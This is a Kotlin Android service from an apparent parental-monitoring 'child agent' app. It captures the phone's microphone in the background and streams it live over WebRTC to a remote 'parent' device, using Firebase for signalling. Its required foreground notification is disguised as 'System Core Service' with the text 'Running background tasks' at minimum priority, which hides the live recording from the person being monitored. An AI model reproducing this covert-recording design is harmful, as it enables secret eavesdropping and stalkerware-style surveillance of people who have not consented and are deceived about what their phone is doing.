package com.example.xshield.childagent

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.FirebaseApp
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import org.webrtc.*
import org.webrtc.audio.JavaAudioDeviceModule
import android.media.MediaRecorder

class AudioSharingService : Service() {

    private val TAG = "AudioSharingService"
    private val CHANNEL_ID = "AudioSharingChannel"
    private val NOTIF_ID = 201

    private var deviceId: String? = null
    private val rtdb by lazy { FirebaseDatabase.getInstance(FirebaseApp.getInstance("webrtc")) }

    private var peerConnectionFactory: PeerConnectionFactory? = null
    private var peerConnection: PeerConnection? = null
    private var audioSource: AudioSource? = null
    private var localAudioTrack: AudioTrack? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Foreground service type microphone ensures we can record audio while in the background
                val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE else 0
                startForeground(NOTIF_ID, buildNotification(), type)
            } else {
                startForeground(NOTIF_ID, buildNotification())
            }
        } catch (e: Exception) {
            e.printStackTrace()
            try {
                startForeground(NOTIF_ID, buildNotification())
            } catch (ex: Exception) {
                ex.printStackTrace()
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action
        deviceId = intent?.getStringExtra("deviceId")

        if (deviceId.isNullOrBlank()) {
            stopSelf()
            return START_NOT_STICKY
        }

        when (action) {
            "START_AUDIO" -> {
                Log.d(TAG, "START_AUDIO action received")
                if (peerConnectionFactory == null) {
                    startWebRtcSession()
                }
            }
            "STOP_AUDIO" -> {
                Log.d(TAG, "STOP_AUDIO action received")
                stopWebRtcSession()
                stopSelf()
            }
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        stopWebRtcSession()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            stopForeground(STOP_FOREGROUND_REMOVE)
        } else {
            stopForeground(true)
        }
        super.onDestroy()
    }

    private fun startWebRtcSession() {
        updateSessionStatus("connecting")

        PeerConnectionFactory.initialize(
            PeerConnectionFactory.InitializationOptions.builder(this)
                .setEnableInternalTracer(true)
                .createInitializationOptions()
        )

        val audioDeviceModule = JavaAudioDeviceModule.builder(this)
            .setUseHardwareAcousticEchoCanceler(true)
            .setUseHardwareNoiseSuppressor(true)
            .setAudioSource(MediaRecorder.AudioSource.MIC)
            .createAudioDeviceModule()

        val options = PeerConnectionFactory.Options()
        peerConnectionFactory = PeerConnectionFactory.builder()
            .setOptions(options)
            .setAudioDeviceModule(audioDeviceModule)
            .createPeerConnectionFactory()
            
        audioDeviceModule.release()

        // Create Audio Source and Track
        val audioConstraints = MediaConstraints()
        audioConstraints.mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression", "true"))
        audioConstraints.mandatory.add(MediaConstraints.KeyValuePair("googHighpassFilter", "true"))
        audioConstraints.mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation", "true"))
        
        audioSource = peerConnectionFactory?.createAudioSource(audioConstraints)
        localAudioTrack = peerConnectionFactory?.createAudioTrack("101", audioSource)

        val iceServers = listOf(
            PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer()
        )

        val rtcConfig = PeerConnection.RTCConfiguration(iceServers)
        peerConnection = peerConnectionFactory?.createPeerConnection(rtcConfig, object : PeerConnection.Observer {
            override fun onSignalingChange(state: PeerConnection.SignalingState?) {}
            override fun onIceConnectionChange(state: PeerConnection.IceConnectionState?) {
                Log.d(TAG, "ICE Connection State: $state")
                when (state) {
                    PeerConnection.IceConnectionState.CONNECTED -> updateSessionStatus("live")
                    PeerConnection.IceConnectionState.DISCONNECTED -> updateSessionStatus("offline")
                    PeerConnection.IceConnectionState.FAILED -> {
                        updateSessionStatus("error")
                        stopSelf()
                    }
                    else -> {}
                }
            }
            override fun onIceConnectionReceivingChange(receiving: Boolean) {}
            override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) {}
            override fun onIceCandidate(candidate: IceCandidate?) {
                candidate?.let {
                    val ref = rtdb.getReference("devices/$deviceId/audioSignaling/iceCandidates").push()
                    ref.setValue(mapOf(
                        "sdpMid" to it.sdpMid,
                        "sdpMLineIndex" to it.sdpMLineIndex,
                        "candidate" to it.sdp,
                        "type" to "child"
                    ))
                }
            }
            override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>?) {}
            override fun onAddStream(stream: MediaStream?) {}
            override fun onRemoveStream(stream: MediaStream?) {}
            override fun onDataChannel(dataChannel: DataChannel?) {}
            override fun onRenegotiationNeeded() {}
            override fun onAddTrack(receiver: RtpReceiver?, mediaStreams: Array<out MediaStream>?) {}
        })

        peerConnection?.addTrack(localAudioTrack, listOf("audioMediaStream"))

        peerConnection?.createOffer(object : SdpObserver {
            override fun onCreateSuccess(desc: SessionDescription?) {
                peerConnection?.setLocalDescription(this, desc)
                desc?.let {
                    rtdb.getReference("devices/$deviceId/audioSignaling/offers").setValue(mapOf(
                        "type" to it.type.canonicalForm(),
                        "sdp" to it.description
                    ))
                }
            }
            override fun onSetSuccess() {}
            override fun onCreateFailure(s: String?) {}
            override fun onSetFailure(s: String?) {}
        }, MediaConstraints())

        listenForAnswer()
        listenForIceCandidates()
    }

    private fun listenForAnswer() {
        val answerRef = rtdb.getReference("devices/$deviceId/audioSignaling/answers")
        answerRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (snapshot.exists()) {
                    val typeStr = snapshot.child("type").getValue(String::class.java) ?: "answer"
                    val sdp = snapshot.child("sdp").getValue(String::class.java) ?: ""
                    val type = SessionDescription.Type.fromCanonicalForm(typeStr)
                    val desc = SessionDescription(type, sdp)
                    peerConnection?.setRemoteDescription(object : SdpObserver {
                        override fun onCreateSuccess(p0: SessionDescription?) {}
                        override fun onSetSuccess() {}
                        override fun onCreateFailure(p0: String?) {}
                        override fun onSetFailure(p0: String?) {}
                    }, desc)
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun listenForIceCandidates() {
        val iceRef = rtdb.getReference("devices/$deviceId/audioSignaling/iceCandidates")
        iceRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                for (child in snapshot.children) {
                    val type = child.child("type").getValue(String::class.java)
                    if (type == "parent") {
                        val sdpMid = child.child("sdpMid").getValue(String::class.java) ?: ""
                        val sdpMLineIndex = child.child("sdpMLineIndex").getValue(Int::class.java) ?: 0
                        val candidateSdp = child.child("candidate").getValue(String::class.java) ?: ""
                        val candidate = IceCandidate(sdpMid, sdpMLineIndex, candidateSdp)
                        peerConnection?.addIceCandidate(candidate)
                    }
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun stopWebRtcSession() {
        updateSessionStatus("idle")
        
        peerConnection?.close()
        peerConnection = null
        
        audioSource?.dispose()
        audioSource = null
        
        peerConnectionFactory?.dispose()
        peerConnectionFactory = null
        
        deviceId?.let { id ->
            rtdb.getReference("devices/$id/audioSignaling").removeValue()
        }
    }

    private fun updateSessionStatus(status: String) {
        deviceId?.let {
            rtdb.getReference("devices/$it/audioSession/status").setValue(status)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Core Service",
                NotificationManager.IMPORTANCE_MIN
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running background tasks")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }
}
